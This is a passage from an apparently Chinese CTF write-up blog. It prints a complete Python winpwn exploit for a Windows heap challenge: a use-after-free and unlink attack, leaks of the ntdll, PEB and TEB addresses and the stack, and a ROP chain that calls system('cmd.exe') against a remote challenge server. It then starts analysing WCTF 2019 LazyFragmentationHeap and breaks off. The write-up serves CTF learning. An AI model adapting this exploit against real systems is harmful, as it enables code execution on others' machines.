free(language[24]);</code>的状态，然后利用UAF改掉<code>language[22]</code>的<code>Flink</code>和<code>Blink</code>，进行unlink attack。<br> 这样，<code>vector engineer</code>相应成员的<code>language</code>（记为<code>victim_1</code>）就指向了自己，从而可以借此进行任意地址读写。</li><li>这里采用先让该<code>victim</code>指向另一个未被删除的<code>language</code>（记为<code>victim_2</code>）的位置，从而避免了如果直接修改<code>victim_1</code>本身，那么完成了一次任意地址写之后，就控不回<code>victim_1</code>的情况了；另外，由于<code>language</code>是不会被打印出来的，这里要通过修改<code>engineer</code>的另一个类成员的<code>title</code>指针，使其指向另一个未被修改的<code>title</code>指针，从而在<code>list</code>的时候将<code>text</code>的地址打印出来。同样的方法，可以leak任意可读地址的数据。</li><li>需要注意的是，由于我们后续的目标是执行<code>system(&quot;cmd.exe&quot;)</code>，并且该调用会触发内存分配的操作，所以要求heap结构处于合法的状态，否则会被检测从而报错退出。因此，只要将<code>victim_1</code>的原<code>Flink</code>和<code>Blink</code>的双向链表进行修复即可。</li><li>之后就是一个标准操作，通过binary的IAT表，leak出<code>ntdll</code>和<code>ucrtbase</code>的基址，并通过<code>ntdll!PebLdr</code>上方存在的<code>PEB</code>相关地址leak出<code>PEB</code>并且计算出<code>TEB</code>的位置（两者偏移固定），然后将<code>TEB-&gt;StackLimit</code>给leak出来得到该进程的栈地址，最后通过暴力搜索找到<code>main</code>函数的返回地址。</li><li>最后通过任意地址写在<code>main</code>函数返回地址处写入ROP，从而在返回时触发调用<code>system(&quot;cmd.exe&quot;)</code>。</li></ol><blockquote><p>虽然windows的heap还是具有一定的不确定性，成功率不是100%，主要在于最开始以0x8a0作为偏移这里可能会有不确定性，但是本地的交互速度以及准确率还是很可观的，马上就能有结果。<br>比较恶心的，本地尚且无法100%，加上远程环境毕竟和我本地的win10不同，所以实际在打远程的时候一度让我怀疑人生，一直都是失败，最后终于是成功了一次。<br>虽然我曾花了很大的功夫，企图提高成功率，但终究无果，不知道有没有更好的方法。</p></blockquote><h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> winpwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'error'</span></span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process("./windowsland.exe")</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">26564</span>)</span><br><span class="line"><span class="comment"># p = remote("127.0.0.1", 10000)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># if len(sys.argv) == 2 and sys.argv[1] == "1":</span></span><br><span class="line"><span class="comment">#     windbgx.attach(p)</span></span><br><span class="line"></span><br><span class="line">menu = [</span><br><span class="line">    <span class="string">"create"</span>,</span><br><span class="line">    <span class="string">"edit"</span>,</span><br><span class="line">    <span class="string">"list"</span>,</span><br><span class="line">    <span class="string">"delete"</span>,</span><br><span class="line">    <span class="string">"exit"</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">choose_func</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.sendlineafter(<span class="string">"&gt;&gt; "</span>, menu[idx])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_teacher</span><span class="params">(age, name, subject)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which college&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What subject&gt; "</span>, subject)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_engineer</span><span class="params">(age, name, language)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What salary&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which title&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What language&gt; "</span>, language)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_doctor</span><span class="params">(age, name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How long&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_athlete</span><span class="params">(age, name, sport)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which country&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What sport&gt; "</span>, sport)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_pig</span><span class="params">(age, name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"age&gt; "</span>, str(age))</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How heavy&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"How tall&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which kind&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_teacher</span><span class="params">(name, subject)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which subject&gt; "</span>, subject)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_engineer</span><span class="params">(name, language)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"What language&gt; "</span>, language)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_doctor</span><span class="params">(name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_athlete</span><span class="params">(name, hospital)</span>:</span></span><br><span class="line">    choose_func(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line">    p.sendlineafter(<span class="string">"Which hospital&gt; "</span>, hospital)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_all</span><span class="params">()</span>:</span></span><br><span class="line">    choose_func(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_teacher</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"1"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_engineer</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"2"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_doctor</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"3"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_athlete</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"4"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_pig</span><span class="params">(name)</span>:</span></span><br><span class="line">    choose_func(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"What kind of human&gt; "</span>, <span class="string">"5"</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">"name&gt; "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">quit</span><span class="params">()</span>:</span></span><br><span class="line">    choose_func(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_info</span><span class="params">(target_item, addr)</span>:</span></span><br><span class="line">    edit_engineer(<span class="string">"22"</span>, p64(target_item + <span class="number">0x30</span>) + p64(addr))</span><br><span class="line">    show_all()</span><br><span class="line">    p.recvuntil(<span class="string">"Engineer 23(23) was promoted as "</span>)</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">','</span>, timeout=<span class="number">1</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>)[:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_doctor(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_athlete(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        add_engineer(<span class="number">0</span>, <span class="string">"heapaddr"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">            <span class="keyword">if</span> i == <span class="number">1</span>:</span><br><span class="line">                add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">            add_teacher(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>, <span class="number">20</span>):</span><br><span class="line">            add_engineer(i, str(i), <span class="string">""</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>, <span class="number">27</span>):</span><br><span class="line">            add_engineer(i, str(i), str(i))</span><br><span class="line"></span><br><span class="line">        show_all()</span><br><span class="line">        p.recvuntil(<span class="string">"heapaddr"</span>)</span><br><span class="line">        heap_addr = u64(p.recvuntil(<span class="string">"(0)"</span>).replace(<span class="string">'\r\n'</span>, <span class="string">'\n'</span>)[:<span class="number">-3</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">assert</span> heap_addr != <span class="number">0</span>, <span class="string">"heap address should not be 0!"</span> </span><br><span class="line"></span><br><span class="line">        current_engineer_vector = heap_addr + <span class="number">0x8a0</span> <span class="comment"># not always right</span></span><br><span class="line">        target_item = current_engineer_vector + <span class="number">0x438</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># unlink attack</span></span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, <span class="string">""</span>)</span><br><span class="line">        edit_engineer(<span class="string">"24"</span>, <span class="string">""</span>)</span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, p64(target_item - <span class="number">8</span>) + p64(target_item))</span><br><span class="line">        edit_engineer(<span class="string">"21"</span>, <span class="string">""</span>) </span><br><span class="line">        </span><br><span class="line">        <span class="comment"># # use chunk 22 to control chunk 23</span></span><br><span class="line">        edit_engineer(<span class="string">"22"</span>, p64(target_item + <span class="number">0x30</span>))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># now 22 points to itself</span></span><br><span class="line">        engineer_24_chunk = leak_info(target_item, target_item + <span class="number">0x60</span>)</span><br><span class="line">        <span class="keyword">assert</span>(engineer_24_chunk != u64(<span class="string">"Engineer"</span>)) <span class="comment"># not always success</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>] == <span class="string">"1"</span>:</span><br><span class="line">            windbgx.attach(p)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = remote("127.0.0.1", 10000)</span></span><br><span class="line">        p = remote(<span class="string">"node3.buuoj.cn"</span>, <span class="number">26564</span>)</span><br><span class="line">        <span class="comment"># p = process("./windowsland.exe")</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># fix double linked list</span></span><br><span class="line">engineer_25_chunk = leak_info(target_item, target_item + <span class="number">0x90</span>)</span><br><span class="line">chunk_size = engineer_25_chunk - engineer_24_chunk</span><br><span class="line"></span><br><span class="line">engineer_22_chunk_flink = current_engineer_vector - <span class="number">0x3a0</span></span><br><span class="line">engineer_22_chunk_blink = engineer_24_chunk</span><br><span class="line">engineer_22_chunk = current_engineer_vector + <span class="number">0x550</span> + chunk_size * <span class="number">2</span></span><br><span class="line">engineer_22_chunk_blink_blink = leak_info(target_item, engineer_22_chunk_blink + <span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(engineer_22_chunk_flink + <span class="number">8</span>))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(engineer_22_chunk_blink))</span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(engineer_22_chunk_blink))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(engineer_22_chunk_flink) + p64(engineer_22_chunk_blink_blink))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak textaddr</span></span><br><span class="line">text_base = leak_info(target_item, target_item + <span class="number">0x68</span>) - <span class="number">0x6418</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak ntdll</span></span><br><span class="line">RtlLookupFunctionEntry_iat = text_base + <span class="number">0x6210</span></span><br><span class="line">ntdll = leak_info(target_item, RtlLookupFunctionEntry_iat) - <span class="number">0x40FB0</span> <span class="comment">#0x32BE0#</span></span><br><span class="line">ntdll_peb_addr = ntdll + <span class="number">0x151328</span> <span class="comment">#0x16a448#</span></span><br><span class="line">malloc_iat = text_base + <span class="number">0x60F0</span></span><br><span class="line">urctbase = leak_info(target_item, malloc_iat) - <span class="number">0x112A0</span> <span class="comment">#0xfda0#</span></span><br><span class="line">system = urctbase + <span class="number">0xA40C0</span> <span class="comment">#0xAE5C0#</span></span><br><span class="line">pop_rcx = urctbase + <span class="number">0x3526E</span> <span class="comment">#0x9209d#</span></span><br><span class="line">str_cmd_exe = urctbase + <span class="number">0xC80F0</span> <span class="comment">#0xD0CB0#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak peb and teb</span></span><br><span class="line">PEB = leak_info(target_item, ntdll_peb_addr) - <span class="number">0x80</span></span><br><span class="line">TEB = PEB + <span class="number">0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak stack address</span></span><br><span class="line">stack_end = (leak_info(target_item, TEB + <span class="number">0x11</span>) &lt;&lt; <span class="number">8</span>) + <span class="number">0x4000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># find where return address is stored</span></span><br><span class="line">ret_from_main = text_base + <span class="number">0x4288</span></span><br><span class="line">ret_addr_pos = stack_end - <span class="number">8</span></span><br><span class="line"><span class="keyword">while</span> ret_addr_pos &gt; stack_end - <span class="number">0x3000</span>:</span><br><span class="line">    <span class="keyword">if</span> leak_info(target_item, ret_addr_pos) == ret_from_main:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ret_addr_pos -= <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># info</span></span><br><span class="line">print(<span class="string">"[+] heap address is: "</span> + hex(heap_addr))</span><br><span class="line">print(<span class="string">"[+] current engineer vector address should be: "</span> + hex(current_engineer_vector))</span><br><span class="line">print(<span class="string">"[+] text address is: "</span> + hex(text_base))</span><br><span class="line">print(<span class="string">"[+] ntdll base is: "</span> + hex(ntdll))</span><br><span class="line">print(<span class="string">"[+] urctbase base is: "</span> + hex(urctbase))</span><br><span class="line">print(<span class="string">"[+] ntdll_peb_addr address is: "</span> + hex(ntdll_peb_addr))</span><br><span class="line">print(<span class="string">"[+] PEB address is: "</span> + hex(PEB))</span><br><span class="line">print(<span class="string">"[+] TEB address is: "</span> + hex(TEB))</span><br><span class="line">print(<span class="string">"[+] stack end address is: "</span> + hex(stack_end))</span><br><span class="line">print(<span class="string">"[+] ret_addr_pos is: "</span> + hex(ret_addr_pos))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ret_addr_pos == stack_end - <span class="number">0x3000</span>:</span><br><span class="line">    print(<span class="string">"Try again"</span>)</span><br><span class="line">    exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># write ret address</span></span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(ret_addr_pos))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(pop_rcx) + p64(str_cmd_exe) + p64(pop_rcx + <span class="number">1</span>))</span><br><span class="line">edit_engineer(<span class="string">"22"</span>, p64(ret_addr_pos + <span class="number">0x18</span>))</span><br><span class="line">edit_engineer(<span class="string">"23"</span>, p64(system))</span><br><span class="line"></span><br><span class="line"><span class="comment"># trigger</span></span><br><span class="line">quit()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Windows-WCTF-2019-LazyFragmentationHeap"><a href="#Windows-WCTF-2019-LazyFragmentationHeap" class="headerlink" title="[Windows][WCTF 2019]LazyFragmentationHeap"></a>[Windows][WCTF 2019]LazyFragmentationHeap</h1><p>这题靶机上没有”magic.txt”，所以没法打通，因此只在本地复现了一下，学到不少东西。</p><h2 id="题目分析-7"><a href="#题目分析-7" class="headerlink" title="题目分析"></a>题目分析</h2><p>首先题目提供了一个菜单，常规的<code>create</code>、<code>edit</code>、<code>show</code>、<code>delete</code>一个chunk的功能，以及一个额外的<code>open</code>、<code>read</code>一个”magic.txt`文件的内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. Allocate buffer for File</span><br><span class="line">2. Edit File content</span><br><span class="line">3. Show content</span><br><span class="line">4. Clean content</span><br><span class="line">5. LazyFileHandler</span><br><span class="line">6. Exit</span><br></pre></td></tr></table></figure><p>需要注意的是：</p><ul><li><p>这里我把相关的结构体定义一下：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> file_buf        struc ; (<span class="keyword">sizeof</span>=<span class="number">0x28</span>, mappedto_36)</span><br><span class="line"><span class="number">00000000</span> exist_status    dq ?</span><br><span class="line"><span class="number">00000008</span> <span class="built_in">size</span>            dq ?</span><br><span class="line"><span class="number">00000010</span> id              dq ?</span><br><span class="line"><span class="number">00000018</span> edit_status     dq ?</span><br><span class="line"><span class="number">00000020</span> <span class="built_in">buffer</span>          dq ?</span><br><span class="line"><span class="number">00000028</span> file_buf        ends</span><br></pre></td></tr></table></figure></li><li><p><code>create</code>限制大小在<code>0x80 ~ 0x2000</code>之间；</p></li><li><p><code>edit</code>限制同一个chunk只能进行两次，因为每次<code>edit</code>之前：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !<span class="built_in">array</span>[v16].<span class="built_in">buffer</span></span><br><span class="line">  || <span class="built_in">array</span>[v18].edit_status != <span class="number">0xDDAABEEF1ACD</span>i64</span><br><span class="line">  || <span class="built_in">array</span>[v18].exist_status != <span class="number">0xDDAABEEF1ACD</span>i64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Error !"</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">-3</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  都会检查<code>edit_status</code>，并且<code>edit</code>之后：</p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">array</span>[v18].edit_status ^= <span class="number">0xFACEB00CA4DADDAA</span>ui64;</span><br></pre></td></tr></table></figure><p>  都会更改这个<code>edit_status</code>，因此下次就不能再写了。</p><p>  但是<code>edit</code>里面存在一个典型的通过<code>strlen</code>获取写入长度的漏洞，因此可以覆盖到下一个chunk的头（6 bytes），构造chunk overlap。</p></li><li><p><code>delete</code>限制只能使用两次。</p></li><li><p><code>LazyFileHandler</code>里面<code>open</code>次数不受限制，但是<code>read</code>只能两次，但是可以任意size读（只要不超过文件大小）。</p></li></ul><h2 id="利用思路-7"><a href="#利用思路-7" class="headerlink" title="利用思路"></a>利用思路</h2><ol><li>首先<code>create</code>几个比较大的chunk，因为是在default heap上分配的，所以碎片比较多，但是size大的chunk不受影响，并且相邻： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 